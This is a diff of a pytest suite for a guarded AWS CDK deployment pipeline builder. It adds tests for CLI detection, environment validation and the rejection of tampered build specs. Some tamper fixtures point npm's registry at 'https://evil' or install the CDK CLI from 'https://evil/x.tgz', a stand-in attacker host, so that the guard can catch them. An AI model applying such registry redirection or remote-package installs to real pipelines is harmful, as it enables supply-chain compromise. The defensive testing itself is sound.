@@ -90,7 +90,8 @@ def test_the_cli_guard_sees_the_cdk_cli_anywhere(command):
     [
         "ls cdk.out", "cat cdk.json", "pip install aws-cdk-lib==2.170.0", "pip install cdk-nag",
         "python -m cdk_nag", "npm i cdk8s", "./scripts/pre-deploy.sh", "echo my-cdk-app",
-        "pip install -r requirements.txt",
+        "pip install -r requirements.txt", "npm install @aws-cdk/integ-tests-alpha",
+        "npm i @aws-cdk/aws-lambda-python-alpha@2.170.0-alpha.0",
     ],
 )
 def test_the_cli_guard_ignores_files_and_libraries(command):
@@ -223,7 +224,8 @@ def test_require_approval_is_added_unless_the_repo_sets_it():
 
 @pytest.mark.parametrize(
     "envs",
-    [[("12345", "us-east-1")], [("111122223333", "us-east")], [("111122223333",)], [("111122223333", "us-east-1", "x")]],
+    [[("12345", "us-east-1")], [("111122223333", "us-east")], [("111122223333",)],
+     [("111122223333", "us-east-1", "x")], [(111122223333, "us-east-1")]],
 )
 def test_deploy_environments_are_validated(envs):
     with pytest.raises(ValueError, match="deploy_environments"):
@@ -243,7 +245,7 @@ def test_deploy_environments_add_only_bootstrap_roles_to_the_deploy_action():
     }
     holders = [v for v in docs.values() if "role/cdk-hnb659fds-" in v]
     assert len(holders) == 1, "only the deploy action may assume the CDK bootstrap roles"
-    assert "arn:aws:iam::111122223333:role/cdk-hnb659fds-*-role-111122223333-eu-west-1" in holders[0]
+    assert '"arn:", {"Ref": "AWS::Partition"}, ":iam::111122223333:role/cdk-hnb659fds-*-role-111122223333-eu-west-1"' in holders[0]
     c.assert_standard_contract(t, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])
 
 
@@ -359,6 +361,19 @@ def test_scan_gate_and_deploy_read_the_same_artifact(tpl):
     for g in GATES:
         assert out["Name"] not in inputs(actions(tpl, "Gates")[f"Gate-{g.name}"])
     assert c.step_mounts(tpl, "Gate-scan") == {out["Name"]: "cdk.out"}
+
+
+@pytest.mark.parametrize("extra", [{"env": {"X": "1"}}, {"policy_statements": [
+    iam.PolicyStatement(actions=["ssm:GetParameter"], resources=["arn:aws:ssm:us-east-1:0:parameter/x"])]}])
+def test_env_or_iam_without_pre_deploy_work_is_refused_not_dropped(extra):
+    with pytest.raises(ValueError, match="would be dropped"):
+        asm_build(deploy_step=DeployStep("app", stacks=["AppStack"], **extra))
+
+
+def test_a_script_only_assembly_gate_is_told_how_to_fix_it():
+    with pytest.raises(ValueError, match=r"\./scripts/scan\.sh cdk\.out"):
+        asm_build(gates=[*GATES, Gate("scan", ["./scripts/scan.sh"], uses_assembly=True)])
+    asm_build(gates=[*GATES, Gate("scan", ["./scripts/scan.sh cdk.out"], uses_assembly=True)])
 
 
 def test_a_gate_pointed_at_another_directory_is_refused():
@@ -700,7 +715,8 @@ def _scan_in_parallel_with_assembly(res):
         (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp["phases"]["build"].__setitem__("finally", ["cdk deploy B"])), "settings besides commands"),
         (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp["phases"]["build"].__setitem__("on-failure", "CONTINUE")), "settings besides commands"),
         (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp.__setitem__("env", {"variables": {"NODE_OPTIONS": "x"}})), "extra keys"),
-        (lambda r: _project(r, "Deploy-app")["Environment"]["EnvironmentVariables"].append({"Name": "npm_config_registry", "Type": "PLAINTEXT", "Value": "https://evil"}), "besides CI"),
+        (lambda r: _project(r, "Deploy-app")["Environment"]["EnvironmentVariables"].append({"Name": "npm_config_registry", "Type": "PLAINTEXT", "Value": "https://evil"}), "besides a plaintext CI"),
+        (lambda r: _project(r, "Deploy-app")["Environment"]["EnvironmentVariables"][0].__setitem__("Type", "PARAMETER_STORE"), "besides a plaintext CI"),
         (lambda r: _project(r, "Deploy-app")["Environment"].__setitem__("Image", "aws/codebuild/amazonlinux-x86_64-lambda-standard:python3.12"), "Node Lambda image"),
         (lambda r: _action(r, "Deploy", "Deploy-app")["Configuration"].__setitem__("EnvironmentVariables", "[]x"), "action-level"),
         (lambda r: _edit_deploy(r, lambda cmds: cmds.__setitem__(cmds.index(next(x for x in cmds if "aws-cdk@" in x)), "npm install -g --prefix /tmp/nodejs aws-cdk@https://evil/x.tgz")), "pinned CDK CLI version"),
